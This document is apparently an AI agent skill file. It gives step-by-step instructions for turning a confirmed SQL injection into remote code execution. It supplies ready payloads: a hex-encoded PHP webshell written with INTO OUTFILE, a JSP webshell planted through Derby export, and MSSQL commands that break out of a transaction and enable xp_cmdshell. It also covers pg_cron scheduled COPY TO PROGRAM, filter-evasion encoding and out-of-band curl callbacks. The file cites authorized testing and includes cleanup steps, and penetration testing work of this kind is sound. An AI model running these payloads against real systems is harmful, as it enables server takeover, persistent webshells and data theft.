---
name: sqli-to-rce-escalation
description: Escalate a confirmed SQL injection point into server-side command execution or a webshell. Use when you already have injection (stacked queries, ORDER BY, second-order, or error/UNION) and the DB account holds privileges that reach the OS — MSSQL xp_cmdshell, PostgreSQL COPY TO PROGRAM / pg_cron, MySQL INTO OUTFILE, or Java-embedded DB export procedures. Covers privilege checks, transaction-context breakout, and non-stacked reach.
---

# SQLi to RCE Escalation

You have a confirmed SQL injection point. Data extraction is not the goal — code execution is. This skill turns an injection into OS command execution or a planted webshell by abusing DBMS features that reach the filesystem or a shell.

Do this only against targets you are explicitly authorized to test. RCE payloads are destructive to shared state; keep markers unique and clean up.

## When To Use

- Injection is confirmed (stacked, `ORDER BY`, second-order, UNION, or error-based) and you want maximum impact.
- The DB account may be high-privilege (`sysadmin`, `SUPERUSER`, `DBA`, DB owner).
- You need to prove impact beyond read access for a report.

If you only need to read data through a blind oracle, use **blind-sqli-extraction** instead. Come back here once you know the DBMS and privilege level.

## Escalation Decision Flow

1. **Fingerprint the DBMS** — `@@version` (MSSQL/MySQL), `version()` (PostgreSQL), `banner FROM v$version` (Oracle), connection URL/driver (embedded Java: Derby, H2, HSQLDB, ObjectDB).
2. **Confirm privilege** — the escalation path is gated on the DB role, not the injection itself. Check before spending requests on a payload that cannot fire.
3. **Confirm injection shape** — stacked queries available? If not, use the non-stacked reach techniques below.
4. **Pick the OS-reach primitive** for that DBMS (table below).
5. **Handle the execution context** — user transaction, comment terminator, encoding, second-order trigger.
6. **Fire, verify with a unique marker, clean up.**

## Privilege Preflight (do this first)

| DBMS | Privilege check | Needed for |
|---|---|---|
| MSSQL | `SELECT IS_SRVROLEMEMBER('sysadmin')` → 1 | `xp_cmdshell`, `sp_configure` |
| MSSQL | `SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'` | is it already on? |
| PostgreSQL | `SELECT rolsuper FROM pg_roles WHERE rolname=current_user` → t | full path: `COPY TO PROGRAM`, `pg_cron`, untrusted PL |
| PostgreSQL | `SELECT pg_has_role(current_user,'pg_execute_server_program','MEMBER')` → t | `COPY TO PROGRAM` **without** SUPERUSER (PG 11+) |
| PostgreSQL | `SELECT extname FROM pg_extension` | is `pg_cron` / `plperlu` present? (see pg_cron database caveat below) |
| MySQL | `SELECT file_priv FROM mysql.user WHERE CURRENT_USER() LIKE CONCAT(user,'@%')` | `FILE` priv gates `INTO OUTFILE`/`DUMPFILE`; UDF also needs writable `@@plugin_dir` |
| MySQL | `SELECT @@secure_file_priv` | **empty `''` = write anywhere; a path = that dir only; `NULL` = file export disabled entirely (escalation dead)** |
| Oracle | `SELECT * FROM session_roles` (DBA?) | `DBMS_SCHEDULER`, Java stored proc |
| Embedded Java (Derby/H2/ObjectDB) | connection is DB owner / default creds | export procedure or ALIAS-to-Java |

If the account is least-privilege, escalation stops here — report the injection at its data-access severity and note the missing privilege as the only barrier.

**Checkpoint:** Do not build an OS-reach payload until the privilege preflight confirms both a qualifying role AND that the primitive is enabled or enable-able. Skipping this wastes requests on a path that cannot fire and increases noise.

## OS-Reach Primitives by DBMS

| DBMS | Primitive | Result |
|---|---|---|
| **MSSQL** | `EXEC xp_cmdshell '<cmd>'` (enable via `sp_configure` if off) | OS command as SQL service account |
| **MSSQL** | `EXEC sp_configure 'Ole Automation Procedures',1` + `sp_OACreate` | command exec without xp_cmdshell |
| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM '<cmd>'` | OS command as postgres user |
| **PostgreSQL** | `cron.schedule_in_database(...)` → scheduled `COPY TO PROGRAM` | deferred exec; **works without stacked queries** (see below) |
| **PostgreSQL** | `CREATE FUNCTION ... LANGUAGE plperlu/plpythonu` | in-process command exec |
| **MySQL/MariaDB** | `SELECT '<webshell>' INTO OUTFILE '/var/www/.../s.php'` | plant a webshell in webroot |
| **MySQL/MariaDB** | UDF `sys_exec`/`sys_eval` via `INTO DUMPFILE` of a `.so`/`.dll` | direct command exec |
| **Oracle** | `DBMS_SCHEDULER.CREATE_JOB` (executable) / `DBMS_JAVA`/`loadjava` | OS command (see external-job caveat) |
| **Derby (embedded)** | `CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(...)` → write JSP/JSP-webshell into servlet docBase | webshell RCE |
| **H2 (embedded)** | `CREATE ALIAS ... AS $$ ... Runtime.exec ... $$` | in-process Java exec |

### MySQL webshell one-liner

```sql
' UNION SELECT 0x3c3f706870...  -- <?php system($_GET[c]); ?> hex
INTO OUTFILE '/var/www/html/uploads/x.php'-- -
```
Requires the `FILE` privilege and a web-served, writable directory allowed by `secure_file_priv` (if `secure_file_priv` is `NULL`, file export is disabled and this path is dead). Use `INTO DUMPFILE` (not `OUTFILE`) for exact bytes when planting a `.so`/`.dll` UDF library into `@@plugin_dir`, then `CREATE FUNCTION sys_exec RETURNS INT SONAME '...'`.

### Derby export-to-webshell (embedded Java DBs)

`SYSCS_UTIL.SYSCS_EXPORT_QUERY` writes a query result to any path. Point it at a Tomcat/Jasper docBase so the written `.jsp` compiles on first GET:

```sql
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(
  'SELECT ''<%Runtime.getRuntime().exec(request.getParameter("c"));%>'' FROM SYSIBM.SYSDUMMY1',
  'webfront/webapps/ROOT/x.jsp', ',', '"', 'UTF-8')
```
Relative paths resolve from the DB process CWD (often the install root). Then `GET /x.jsp?c=id`.

`SYSCS_EXPORT_QUERY` applies CSV quoting: each exported field is wrapped in the character delimiter (`"` above) and CSV-escaped. The planted file becomes `"<%...%>"` — the surrounding quotes are template text outside the scriptlet, so it still compiles, but pick a character delimiter that does not appear in your payload to avoid escaping artifacts. Do not chase a "corrupted webshell" — check the on-disk bytes.

## Execution Context Handling

The payload rarely lands in a clean statement. Three context problems dominate:

### 1. Non-stacked injection (no `;` allowed)

Many sinks are `ORDER BY`, `WHERE`, or a filter that forbids semicolons (or a filter blocks unescaped `;`). You cannot append a second statement — but you can call a side-effect function inline.

- **`ORDER BY` position** accepts an arbitrary scalar expression:
  ```sql
  ORDER BY (SELECT cron.schedule_in_database('j','* * * * *',
    'COPY (SELECT 1) TO PROGRAM ''id > /tmp/mk''','db','user',true))
  ```
  This is a single statement, no semicolon — it bypasses semicolon-blocking filters. The scheduled job then runs `COPY TO PROGRAM` on the next pg_cron tick. Same idea with `lo_export`, or a subselect calling a privileged function.
  - **pg_cron gotcha**: pg_cron runs against its configured `cron.database_name` (often `postgres`) and the `cron` extension must exist there. `schedule_in_database` lets you target another DB, but the scheduler background worker must be loaded (`shared_preload_libraries = 'pg_cron'`). If pg_cron is present but idle, prefer a direct `COPY TO PROGRAM` when stacked queries are available.
- **MSSQL non-stacked**: side effects from a pure subquery are limited (functions cannot run `EXEC`) — prefer finding a stacked sink. Where the injection reaches a procedure/dynamic-SQL context, that context may allow the stacked escalation even if the outer statement does not.
- **Oracle external jobs**: `DBMS_SCHEDULER.CREATE_JOB` with `job_type => 'EXECUTABLE'` needs the external job runner configured (OS credential / `externaljob.ora`), which is often absent on default installs. The `DBMS_JAVA.runjava` / `loadjava` path is the more reliable in-process primitive when the account has Java permissions.
- Confirm the tick/delay and poll your marker; deferred schedulers (pg_cron minimum 1 minute) need a wait.

### 2. Injection inside a user transaction (MSSQL Msg 574)

If the sink executes inside `BEGIN TRANSACTION` (common in queue/processor code), `sp_configure` + `RECONFIGURE` fails:

> Msg 574: CONFIG statement cannot be used inside a user transaction.

**Breakout**: issue `COMMIT;` first in your stacked batch to end the caller's transaction, then run `RECONFIGURE` outside it:

```sql
x','<ts>','<ts>'); COMMIT; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami > C:\Windows\Temp\mk.txt'; --
```

### 3. Second-order injection (write is safe, read is not)

The insert is parameterized (safe), but a later code path concatenates the stored value into a new query. Store the payload through the safe write, then trigger the vulnerable read.

- Identify a stored field that reaches a raw-concatenation read (e.g. a name reused in `... LIKE '<stored>'`).
- Watch for trigger conditions in the read path (e.g. the value must contain `%` to enter a `NOT LIKE` branch).
- Terminate correctly: your payload must close the original string/paren and comment out the trailing SQL (`-- ` with a trailing space, or `#`).
- Leftover rows from prior attempts can consume your comment terminator — clean state or ensure your row executes first.

## Terminator and Encoding Cheatsheet

- Close a string literal, then the statement: `'`, then `); ... --` (leave a trailing space after `--`).
- MySQL comment: `-- ` (space required) or `#` or `/* */`.
- **URL encoding trap**: encode spaces as `%20`, not `+`. Some servers decode `+` literally, corrupting `+COMMIT` etc. Use `urllib.parse.quote(payload, safe='')`, not `quote_plus`/`urlencode`.
- Quote-blocking filters: hex-encode string constants (`0x...` in MSSQL/MySQL, `decode('..','hex')` / `chr()` concat in PostgreSQL) or use `CHAR()`/`CONCAT`.

## Verification

- Write a **unique marker** to a known path (`/tmp/<rand>.txt`, `C:\Windows\Temp\<rand>.txt`) and read it back, or capture command output into a table you then SELECT.
- Prefer an out-of-band callback (see **blind-ssrf-chains** / OOB callback tools) when you cannot read the filesystem — `xp_cmdshell 'nslookup <id>.oob'`, `COPY ... TO PROGRAM 'curl <oob>'`.
- Record the executing identity (`whoami` / `id`) — it sets the true impact (SYSTEM/root vs a low-priv service account).

**Checkpoint:** Treat RCE as confirmed only when a unique marker or captured command output ties back to your specific payload. A 200 response or silent success is not proof — deferred schedulers and second-order reads fire out of band.

## Cleanup

- Drop planted webshells, scheduled jobs (`cron.unschedule`, `DBMS_SCHEDULER.DROP_JOB`), and marker files.
- Reset config you changed only if the target expects it off (`sp_configure 'xp_cmdshell',0; RECONFIGURE`) — note in the report that you toggled it.
- Delete second-order payload rows you inserted.

## Indicators

- **Escalation viable**: privilege preflight returns high-priv role AND an OS-reach primitive is enabled/reachable.
- **Confirmed RCE**: unique marker appears / command output captured, with the executing identity recorded.
- **Context handled**: transaction breakout or non-stacked reach produced the marker where a naive stacked payload failed.

## References

- MSSQL Msg 574 (CONFIG statement inside a user transaction) and the `COMMIT;` breakout — Microsoft T-SQL `RECONFIGURE` / `sp_configure` documentation.
- PostgreSQL `COPY ... TO PROGRAM` and the `pg_execute_server_program` predefined role — PostgreSQL `COPY` reference and predefined-roles documentation.
- pg_cron `cron.schedule_in_database` as a non-stacked side-effect primitive — pg_cron project README (`shared_preload_libraries`, `cron.database_name`).
- Apache Derby `SYSCS_UTIL.SYSCS_EXPORT_QUERY` file-write procedure — Derby system procedures reference.
- MySQL `secure_file_priv` semantics (`''` vs path vs `NULL`) — MySQL server system-variable reference.

## Chain With

- **blind-sqli-extraction** — fingerprint DBMS, extract version/user/privilege before escalating here.
- **timing-attack-recon** / **parser-differential-bypass** — reach the injection point and slip payloads past a WAF.
- **blind-ssrf-chains** — OOB verification when the filesystem is not readable.
- **write-path-to-rce** — once a DB write primitive lands a file, escalate the file-write into execution (framework template/view planting).
- **report-preflight** — severity and eligibility framing before submitting.
